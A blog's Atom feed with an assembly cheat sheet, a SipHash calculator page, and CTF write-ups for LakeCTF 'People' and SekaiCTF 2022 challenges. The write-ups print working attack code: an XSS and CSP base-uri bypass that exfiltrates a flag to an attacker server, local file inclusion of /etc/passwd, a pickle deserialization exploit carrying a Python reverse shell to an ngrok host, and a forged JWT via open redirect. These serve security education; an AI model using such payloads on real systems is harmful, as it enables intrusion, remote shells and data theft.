<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2022-11-10T17:55:32+00:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">x86-64 Assembly Cheat Sheet</title><link href="https://www.cjxol.com/posts/x86-64-cheat-sheet/" rel="alternate" type="text/html" title="x86-64 Assembly Cheat Sheet" /><published>2022-10-19T00:00:00+01:00</published><updated>2022-10-19T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/x86-64-cheat-sheet</id><content type="html" xml:base="https://www.cjxol.com/posts/x86-64-cheat-sheet/"><![CDATA[<p>This is still being updated upon I find useful things.</p>

<h2 id="registers">Registers</h2>

<h3 id="general-purpose-registers">General-Purpose Registers</h3>

<table>
  <thead>
    <tr>
      <th>qword</th>
      <th>dword</th>
      <th>word</th>
      <th>high byte</th>
      <th>low byte</th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>rax</td>
      <td>eax</td>
      <td>ax</td>
      <td>ah</td>
      <td>al</td>
      <td> </td>
    </tr>
    <tr>
      <td>rbx</td>
      <td>ebx</td>
      <td>bx</td>
      <td>bh</td>
      <td>bl</td>
      <td> </td>
    </tr>
    <tr>
      <td>rcx</td>
      <td>ecx</td>
      <td>cx</td>
      <td>ch</td>
      <td>cl</td>
      <td> </td>
    </tr>
    <tr>
      <td>rdx</td>
      <td>edx</td>
      <td>dx</td>
      <td>dh</td>
      <td>dl</td>
      <td> </td>
    </tr>
    <tr>
      <td>rbp</td>
      <td>ebp</td>
      <td>bp</td>
      <td>bph</td>
      <td>bpl</td>
      <td>base pointer</td>
    </tr>
    <tr>
      <td>rsp</td>
      <td>esp</td>
      <td>sp</td>
      <td>sph</td>
      <td>spl</td>
      <td>stack pointer</td>
    </tr>
    <tr>
      <td>rsi</td>
      <td>esi</td>
      <td>si</td>
      <td>sih</td>
      <td>sil</td>
      <td> </td>
    </tr>
    <tr>
      <td>rdi</td>
      <td>edi</td>
      <td>di</td>
      <td>dih</td>
      <td>dil</td>
      <td> </td>
    </tr>
    <tr>
      <td>r8</td>
      <td>r8d</td>
      <td>r8w</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>…</td>
      <td>…</td>
      <td>…</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>r15</td>
      <td>r15d</td>
      <td>r15w</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<h3 id="calling-convention">Calling Convention</h3>

<p>In <a href="https://riptutorial.com/x86/example/11197/64-bit-system-v">64-bit System V</a>:</p>

<table>
  <thead>
    <tr>
      <th>Argument</th>
      <th>1</th>
      <th>2</th>
      <th>3</th>
      <th>4</th>
      <th>5</th>
      <th>6</th>
      <th>7</th>
      <th>8</th>
      <th>9</th>
      <th>10</th>
      <th>…</th>
      <th>return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Location</td>
      <td>rdi</td>
      <td>rsi</td>
      <td>rdx</td>
      <td>rcx</td>
      <td>r8</td>
      <td>r9</td>
      <td>r10</td>
      <td>r11</td>
      <td>[rsp]</td>
      <td>[rsp+8]</td>
      <td>…</td>
      <td>rax</td>
    </tr>
  </tbody>
</table>

<h2 id="conditional-jump-instructions">Conditional Jump Instructions</h2>

<p><a href="http://unixwiz.net/techtips/x86-jumps.html">List of conditional jumps</a>.</p>

<h2 id="extra">Extra</h2>

<h3 id="linux-syscalls">Linux Syscalls</h3>

<p><a href="https://filippo.io/linux-syscall-table/">List of linux syscalls</a>.</p>

<h2 id="more-resources">More Resources</h2>

<ul>
  <li><a href="https://ike.mahaloz.re/">`Ike: The Systems Hacking Handbook</a></li>
</ul>]]></content><author><name></name></author><category term="cheat sheet" /><category term="assembly" /><summary type="html"><![CDATA[This is still being updated upon I find useful things.]]></summary></entry><entry><title type="html">LakeCTF Qualifications People (Web) Writeup</title><link href="https://www.cjxol.com/posts/lakectf-people-writeup/" rel="alternate" type="text/html" title="LakeCTF Qualifications People (Web) Writeup" /><published>2022-10-12T00:00:00+01:00</published><updated>2022-10-12T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/lakectf-people-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/lakectf-people-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>

<p>This is my writeup to web challenge “<a href="https://ctf.polygl0ts.ch/challenges#People-18">People</a>” in <a href="https://ctf.polygl0ts.ch/">LakeCTF</a> Qualifications round. LakeCTF is orgnised by EPFL’s CTF team <a href="https://polygl0ts.ch/">polygl0ts</a>. This challenge is solved by 36 teams out of 191 teams scored at least 1 point on the scoreboard. In this challenge I exploited XSS and improper configuration of CSP, more specifically omitting <code class="highlighter-rouge">base-uri</code>.</p>

<p>The challenge has a downloadable. Examining the code and the application, users can signup a profile with bio and other information, as well as logging in. Upon logging in, user is redirected to their profile page where user information is shown. Users can also report their profile, resulting in the profile page being visited by an admin bot.</p>

<p>This type of web challenges with a bot visiting the page normally involves in exploiting cross-site scripting (XSS).</p>

<p>It appears that it is likely the XSS is on the profile page that the bot visits, and the page displays user information stored in the database. We set the information of the user when signing up the user, however, the signup endpoint is rate limited, so we cannot test many payload through that endpoint on the live website. There is another <code class="highlighter-rouge">/edit</code> endpoint which also enables us to update user information, and there is no rate limit on that endpoint, so we could conveniently test different input on the live website without setting up our own docker container.</p>

<p>Our team managed to quickly find the potential injection point on the profile page. Despite the input are escaped when rendering the page, we noticed that the title also shows data from the database, and the code does not escape it:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% set description = '%s at %s' % (user['title'], user['lab']) %}
{% block title %}{{user['fullname']}} | {{description|safe}}{% endblock %}
</code></pre></div></div>

<p>As shown above, the <code class="highlighter-rouge">safe</code> filter in the template disables escaping. Thus, we managed to put HTML and JavaScript code into the webpage.</p>

<h2 id="bypass-csp">Bypass CSP</h2>

<p>Despite we have managed to inject new tags and code, we could still not make the browser to execute our XSS code. This is because the app sets <code class="highlighter-rouge">Content-Security-Policy</code> HTTP header that only script tags with the defined nonce would run.</p>

<p>However, the CSP did not define <code class="highlighter-rouge">base-uri</code>, and two of the <code class="highlighter-rouge">&lt;script&gt;</code> tags on the profile page did not use full URL:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/static/js/marked.min.js"</span> <span class="na">nonce=</span><span class="s">"qvAsaTf6Pe8F101A71nf7vOt1lktIAiK"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/static/js/purify.min.js"</span> <span class="na">nonce=</span><span class="s">"qvAsaTf6Pe8F101A71nf7vOt1lktIAiK"</span><span class="nt">&gt;&lt;/script&gt;</span>
</code></pre></div></div>

<p>Conveniently, the XSS injection point is in <code class="highlighter-rouge">&lt;title&gt;</code>, which is in <code class="highlighter-rouge">&lt;head&gt;</code>, thus we are able to define new base:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;base</span> <span class="na">href=</span><span class="s">"https://my-server.example.com"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>This will result in one of the script on the profile page to load from <code class="highlighter-rouge">https://my-server.example.com/static/js/marked.min.js</code> and execute.</p>

<p>The final info we set to user’s title in their profile is <code class="highlighter-rouge">&lt;/title&gt;&lt;base href="https://my-server.example.com"&gt;&lt;/head&gt;</code>, and we serve the JavaScript payload at <code class="highlighter-rouge">https://my-server.example.com/static/js/marked.min.js</code>.</p>

<h2 id="getting-the-flag">Getting the Flag</h2>

<p>Now we are able to make the profile page to pop an alert of whatever we put in the JavaScript file. However our goal is to steal the flag. The flag is accessible through the <code class="highlighter-rouge">/flag</code> endpoint in the webapp. The endpoint checks for <code class="highlighter-rouge">admin_token</code> in cookies. We might want to steal the cookies first, however, when the admin bot visits the webpage, their cookie is set to <code class="highlighter-rouge">httpOnly</code>, so we cannot use XSS to get the cookie. As getting the flag is our only goal, we can workaround by using <code class="highlighter-rouge">fetch</code> API or XMLHttpRequest. As when doing such request on the same site, cookies are sent, and flag will be retrieved.</p>

<p>Our final JavaScript for getting the flag and exfil is:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://web:8080/flag</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://my-server.example.com/xss?</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">data</span><span class="p">));</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry><entry><title type="html">SekaiCTF 2022 Writeup</title><link href="https://www.cjxol.com/posts/sekaictf-2022-writeup/" rel="alternate" type="text/html" title="SekaiCTF 2022 Writeup" /><published>2022-10-11T00:00:00+01:00</published><updated>2022-10-11T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/sekaictf-2022-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/sekaictf-2022-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>

<p>This is my writeup to web challenges “<a href="https://ctf.sekai.team/challenges#Bottle-Poem-29">Bottle Poem</a>”, “<a href="https://ctf.sekai.team/challenges#Issues-33">Issues</a>” and reverse challenge “<a href="https://ctf.sekai.team/challenges#Perfect-Match-X-treme-44">Perfect Match X-treme</a>” in <a href="https://ctf.sekai.team/">SekaiCTF 2022</a>. The official source code and solution provided by the challenge authors are here: <a href="https://github.com/project-sekai-ctf/sekaictf-2022">https://github.com/project-sekai-ctf/sekaictf-2022</a>. I started doing the CTF when I joined a team halfway through the CTF. The exploits and skills involved in these 3 challenges in this writeup includes local file inclusion (LFI), unsafe deserialization and remote code execution (RCE), improper use of JWKS, open redirect, Unity game reversing and general/reversing tooling.</p>

<p>On this page:</p>

<ul>
  <li><a href="#bottle-poem-web">Bottle Poem (Web) writeup</a></li>
  <li><a href="#issues-web">Issues (Web) writeup</a></li>
  <li><a href="#perfect-match-x-treme">Perfect Match X-treme (Reverse) writeup</a></li>
</ul>

<h2 id="bottle-poem-web">Bottle Poem (Web)</h2>

<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-index.png" alt="Bottle Poem index page." /></p>

<p>In the first webpage of the challenge, there are three links to “poems in the Bottle”.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-spring.png" alt="First poem in the Bottle." /></p>

<p>Upon clicking the link, we noticed the value of the query parameter <code class="highlighter-rouge">id</code> appears to be the filename of the file to be shown. For example, the link “Spring” links to <code class="highlighter-rouge">http://bottle-poem.ctf.sekai.team/show?id=spring.txt</code>.</p>

<h3 id="local-file-inclusion-and-leaking-source-code">Local File Inclusion and Leaking Source Code</h3>

<p>Filename being passed into as query parameter smells like the recipe for local file inclusion (LFI). Though the challenge description states the flag is an executable, and we cannot just make the webpage to include and display the flag, we however can get more information exploiting LFI.</p>

<p>To confirm LFI, we tried to pass <code class="highlighter-rouge">/etc/passwd</code> as value of <code class="highlighter-rouge">id</code> parameter, and we get content of <code class="highlighter-rouge">/etc/passwd</code> being returned.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-passwd.png" alt="/etc/passwd leaked." /></p>

<p>From the HTTP header <code class="highlighter-rouge">server: WSGIServer/0.2 CPython/3.8.12</code>, I can tell the backend is in Python. Many Python webapps in CTFs would have a <code class="highlighter-rouge">app.py</code> file as the entry point of the apps, so I tried to see if the file exists in the directory of the poem files or the parent directory, which hopefully to be the webapp’s root.</p>

<p>When I tried <code class="highlighter-rouge">../app.py</code>, instead of showing “No This Poems”, it showed “No!!!!”, which means <code class="highlighter-rouge">../app.py</code> file likely exists and the author prevents us from seeing it.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-app-py-no.png" alt="../app.py but we cannot see it." /></p>

<p>Trying with several different “files” known to normally exist on Linux, <code class="highlighter-rouge">/proc/self/cmdline</code> gave me the command runs the webapp <code class="highlighter-rouge">python3 -u /app/app.py</code>. This gave me the absolute location of <code class="highlighter-rouge">app.py</code> file.</p>

<p><code class="highlighter-rouge">/app/app.py</code> worked around the restrictions when using relevant path and leaked the source code of the webapp.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-app-py.png" alt="app.py" /></p>

<p>From the source code, I can see the app used Bottle web framework.</p>

<h3 id="admin-and-other-distractions">Admin? And Other Distractions</h3>

<p>In the function for <code class="highlighter-rouge">/sign</code>, I can see the if we do not have a session prior we will be assigned a guest session, if we have an admin session, we will have a different template rendered.</p>

<p>Without looking into the templates, I started just obtaining admin session. I leaked the secret for signing the cookies from <code class="highlighter-rouge">/app/config/secret.py</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sekai</span> <span class="o">=</span> <span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span>
</code></pre></div></div>

<p>I then installed Bottle and used it to serve webpage that sets signed cookie with data <code class="highlighter-rouge">{"name": "admin"}</code> to obtain the admin cookie:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span>

<span class="o">@</span><span class="n">route</span><span class="p">(</span><span class="s">'/hello'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">hello</span><span class="p">():</span>
    <span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="s">"name"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">}</span>
    <span class="n">response</span><span class="p">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s">"name"</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"Hello World!"</span>

<span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'localhost'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>

<p>The value of the admin cookie produced is <code class="highlighter-rouge">!rsOwvUb6jllVHQVOPlZv5w==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg==</code>. I then set the cookie named <code class="highlighter-rouge">name</code> as this value, and visited <code class="highlighter-rouge">/sign</code>, however, the page shown to me was not impressive. It showed me “Hello, you are admin, but it’s useless.”</p>

<p>I looked around both templates for guest and admin, which are located in <code class="highlighter-rouge">/app/views/</code>, and named <code class="highlighter-rouge">guest.html</code> and <code class="highlighter-rouge">admin.html</code> respectively. The template files are just HTML with template syntax tags. The two lines from those files appear the most interesting as they contains template variable tags:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hello {{{name}}, what r u doing????
Hello, you are {{name}}, but it’s useless.
</code></pre></div></div>

<p>I wondered if any server-side template injection (SSTI) possible here. However, it appeared the <code class="highlighter-rouge">name</code> variable passed into the template is from the session cookie’s <code class="highlighter-rouge">name</code>, and the templates only renders if the value to be “guest” or “admin”, and any other values would not work.</p>

<h3 id="finding-the-exploit">Finding the Exploit</h3>

<p>Bottle is a rather small framework, when I was looking into <a href="https://github.com/bottlepy/bottle/blob/99341ff3791b2e7e705d7373e71937e9018eb081/bottle.py">the source code of Bottle</a> to figure out how to forge the admin cookie, I noticed a deprecate warning at <a href="https://github.com/bottlepy/bottle/blob/99341ff3791b2e7e705d7373e71937e9018eb081/bottle.py#L1850">line 1850</a> about pickling of arbitrary objects into cookies. I did some search and find this rather old <a href="https://github.com/bottlepy/bottle/issues/900">issue</a> from 2016 regarding the security of using pickle to deserialize cookie values, which causes remote code execution (RCE).</p>

<p>Our team crafted a similar payload as the cookie value based on this exploit and got the flag:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">hmac</span>
<span class="kn">import</span> <span class="nn">hashlib</span>

<span class="k">class</span> <span class="nc">RCE</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="s">"""
            python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.eu.ngrok.io",16526));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
        """</span>
        <span class="k">return</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,)</span>

<span class="k">def</span> <span class="nf">gen_cookie</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">b64pld</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">signature</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span>
        <span class="n">hmac</span><span class="p">.</span><span class="n">new</span><span class="p">(</span>
            <span class="sa">b</span><span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span><span class="p">,</span> <span class="n">b64pld</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span>
        <span class="p">).</span><span class="n">digest</span><span class="p">()</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="sa">b</span><span class="s">'"!'</span> <span class="o">+</span> <span class="n">signature</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"?"</span> <span class="o">+</span> <span class="n">b64pld</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'"'</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">pickled</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">RCE</span><span class="p">())</span>
    <span class="k">print</span><span class="p">(</span><span class="n">gen_cookie</span><span class="p">(</span><span class="n">pickled</span><span class="p">))</span>
</code></pre></div></div>

<h3 id="bottle-poem-conclusion">Bottle Poem Conclusion</h3>

<p>In this challenge we exploited LFI to leak information including the source of the webapp, and use of insecure deprecated features of unsafe deserialization in the framework which leads to RCE.</p>

<h2 id="issues-web">Issues (Web)</h2>

<p>This challenge has a downloadable, which contains the source of the challenge. Examining the source, it has an <code class="highlighter-rouge">app.py</code> and an <code class="highlighter-rouge">api.py</code> file contains the most interesting part of the challenge. In <code class="highlighter-rouge">app.py</code>, it has a <code class="highlighter-rouge">/.well-known/jwks.json</code> endpoint which returns a pre-defined JSON Web Key Set (JWKS). The flag is in a text file, and <code class="highlighter-rouge">/api/flag</code> endpoint would return the content of the file. However, the flag api endpoint requires authorization to access.</p>

<p>Looking into the authorization code, it checks bearer tokens in header. The token is a JSON Web Token (JWT), and the public key used to verify the token is from the issuer defined in JWT token, grabbed with <code class="highlighter-rouge">requests.get(url)</code>. Thus, we could use our own public and private key pair to sign the JWT, and point the issuer to somewhere we have control thus provides our own public key for the app to verify the token.</p>

<p>Is it that easy though? Before getting the public key, it checks if the issuer is from <code class="highlighter-rouge">localhost:8080</code> with <code class="highlighter-rouge">urlparse(issuer).netloc</code>. With this check, we can no longer point the issuer to anything we want other than <code class="highlighter-rouge">localhost:8080</code>. I tried to exploit <code class="highlighter-rouge">urlparse</code> to bypass the restriction, however, it did not seem would work (though not relevant, during the research, I learned that <code class="highlighter-rouge">urlparse</code> has interesting behaviour when returning hostnames e.g. <a href="https://bugs.python.org/issue36338">this report on Python bug tracker</a>, and <a href="https://security.snyk.io/vuln/SNYK-JS-URLPARSE-2407759">Python has this issue as described in this CVE for the Node.js package too</a>).</p>

<p>When I reviewed the challenge code again, I noticed the <code class="highlighter-rouge">/logout</code> endpoint has an redirect after clearing the session, which defaults to <code class="highlighter-rouge">home</code>, however it does not do any check on the <code class="highlighter-rouge">redirect</code> parameter if given, and would redirect to whatever is passed onto. This is vulnerable to open redirect. I used this open redirect endpoint to bypass the restriction on issuer, crafted issuer <code class="highlighter-rouge">http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&amp;a=</code>, which results in the app requests JWKS from my own server.</p>

<h3 id="crafting-the-final-payload">Crafting the Final Payload</h3>

<p>Generate RSA private and public key:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa <span class="nt">-out</span> rsa.private 512
openssl rsa <span class="nt">-in</span> rsa.private <span class="nt">-out</span> rsa.public <span class="nt">-pubout</span> <span class="nt">-outform</span> PEM
</code></pre></div></div>

<p>Make <code class="highlighter-rouge">jwks.json</code> to be served with HTTP server:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"keys"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"x5c"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                </span><span class="s2">"&lt;content of public key&gt;"</span><span class="w">
            </span><span class="p">]</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Generate the admin token:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">jwt</span>

<span class="n">private_key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'rsa.private'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

<span class="k">print</span><span class="p">(</span><span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span><span class="s">'user'</span><span class="p">:</span> <span class="s">'admin'</span><span class="p">},</span> <span class="n">private_key</span><span class="p">,</span> <span class="s">'RS256'</span><span class="p">,</span> <span class="p">{</span><span class="s">'issuer'</span><span class="p">:</span> <span class="s">'http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&amp;a='</span><span class="p">})</span>
</code></pre></div></div>

<p>The token looks like this:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9teS1zZXJ2ZXIuZXhhbXBsZS5jb20vLndlbGxfa25vd24vandrcy5qc29uJmE9In0.eyJ1c2VyIjoiYWRtaW4ifQ.quNOTqf6U7kBTFlK32Nm9QhLL9IkRvtsdnfFm8Ct_Cgr8CCjrIc-H-o3oaKJ_UnEVzsizx4BTlFZJQEuXTkB6w
</code></pre></div></div>

<p>Request <code class="highlighter-rouge">/api/flag</code> endpoint with the authorization header using the token:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9teS1zZXJ2ZXIuZXhhbXBsZS5jb20vLndlbGxfa25vd24vandrcy5qc29uJmE9In0.eyJ1c2VyIjoiYWRtaW4ifQ.quNOTqf6U7kBTFlK32Nm9QhLL9IkRvtsdnfFm8Ct_Cgr8CCjrIc-H-o3oaKJ_UnEVzsizx4BTlFZJQEuXTkB6w
</code></pre></div></div>

<p>Get flag <code class="highlighter-rouge">SEKAI{v4l1d4t3_y0ur_i55u3r_plz}</code>.</p>

<h3 id="issues-conclusion">Issues Conclusion</h3>

<p>I exploited the use of JWKS and open redirect in the challenge.</p>

<h2 id="perfect-match-x-treme">Perfect Match X-treme</h2>

<p>This challenge has a downloadable, which contains a Unity game. The game looks similar to Perfect Match minigame in Fall Guys: Ultimate Knockout (<a href="https://youtu.be/edifg0uMzxU">https://youtu.be/edifg0uMzxU</a>). The gameplay is to remember the fruits the tiles corresponding to in each round, and stand on the tiles matching the fruit shown on the screen at the end of the round to progress into the next round.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-game.png" alt="Challenge screenshot." /></p>

<p>However, in the third round of the challenge game, it always shows the SekaiCTF logo on the screen, and no tiles matches. Thus, we cannot finish the game through normal gameplay to finish the game.</p>

<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-eliminated.png" alt="Eliminated screen." /></p>

<p>Examining the files, and reading <a href="https://github.com/imadr/Unity-game-hacking">some guide</a>, I identified <code class="highlighter-rouge">/PerfectMatch_Data/Managed/Assembly-CSharp.dll</code> would be the interesting file that contains the game’s logic (<code class="highlighter-rouge">Assembly-UnityScript.dll</code> would be interesting too if it exists according to the guide).</p>

<p>The next step is to use decompiler for .NET or Unity. I tried to decompile the DLL file with dotPeak, ILSpy and dnSpyEx, and they all worked. I used primarily <a href="https://github.com/dnSpyEx/dnSpy">dnSpyEx</a> during this challenge.</p>

<p>Opening the DLL in dnSpyEx, <code class="highlighter-rouge">GameManager</code> contains the logic of choosing fruits for each round. Browsing around content in the DLL, I find the code for showing the flag is in UI. The screenshot of the content of the decompiled DLL and content of UI is shown below:</p>

<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-decompile-ui.png" alt="Decompiled Assembly-UnityScript.dll content." /></p>

<p>The flag appeared to be 3 pieces of text putting together, I guessed it could be 3 pieces of strings stored in some data file, which might be <code class="highlighter-rouge">/PerfectMatch_Data/level0</code>. To check further, I used <code class="highlighter-rouge">grep -r "SEKAI{" .</code>, and it returned <code class="highlighter-rouge">grep: ./PerfectMatch_Data/level0: binary file matches</code>. Then I used <code class="highlighter-rouge">strings</code> to extract the strings of the flag, and find this part of the output looks like the strings for the flag:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEKAI{F4LL_GUY5_
fff?fff?
Qualified!
1LL3G4L}
H3CK_15_
</code></pre></div></div>

<p>Putting the 3 parts together, got the flag <code class="highlighter-rouge">SEKAI{F4LL_GUY5_H3CK_15_1LL3G4L}</code>.</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry><entry><title type="html">SipHash Calculator</title><link href="https://www.cjxol.com/posts/siphash-calculator/" rel="alternate" type="text/html" title="SipHash Calculator" /><published>2022-07-08T00:00:00+01:00</published><updated>2022-07-08T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/siphash-calculator</id><content type="html" xml:base="https://www.cjxol.com/posts/siphash-calculator/"><![CDATA[<link rel="stylesheet" href="/assets/css/bootstrap-custom.css" />

<form class="bootstrap">
    <div class="form-group row">
        <label for="message" class="col-2 col-form-label">Message</label>
        <textarea class="form-control col" id="message" row="1"></textarea>
        <select id="messageType" class="form-control col-3" title="Message type">
            <option selected="">Text</option>
            <option>Hex</option>
            <option>Base64</option>
        </select>
    </div>
    <div class="form-group row">
        <label for="key" class="col-2 col-form-label">Key</label>
        <input class="form-control col" type="text" id="key" />
        <select id="keyType" class="form-control col-3" title="Key type">
            <option selected="">Text</option>
            <option>Hex</option>
            <option>Decimal</option>
            <option>Base64</option>
        </select>
    </div>
    <div class="form-group row">
        <span class="col-2">SipRound</span>
        <label for="c" class="col-1 col-form-label">c</label>
        <input class="form-control col-1" type="number" id="c" value="2" min="0" step="1" />
        <label for="d" class="col-1 col-form-label">d</label>
        <input class="form-control col-1" type="number" id="d" value="4" min="0" step="1" />
    </div>
    <button class="btn btn-primary" type="submit" id="calculate">Calculate</button>
    <div class="form-group row">
        <label for="hash" class="col-2 col-form-label">Hash</label>
        <input class="form-control col" type="text" id="hash" readonly="" />
        <select id="hashType" class="form-control col-3" title="Hash type">
            <option selected="">Hex</option>
            <option>Decimal</option>
            <option>Base64</option>
        </select>
    </div>
    <div class="alert alert-danger" role="alert" id="error" hidden="">
        Something went wrong...
    </div>
</form>

<p>I implemented the SipHash algorithm followed <a class="citation" href="#siphash">(Aumasson &amp; Bernstein, 2012)</a>. You can see <a href="https://github.com/allc/SipHash">my Python code</a>, and this webpage uses <a href="https://pyscript.net/">PyScript</a> to run Python code in the browser.</p>

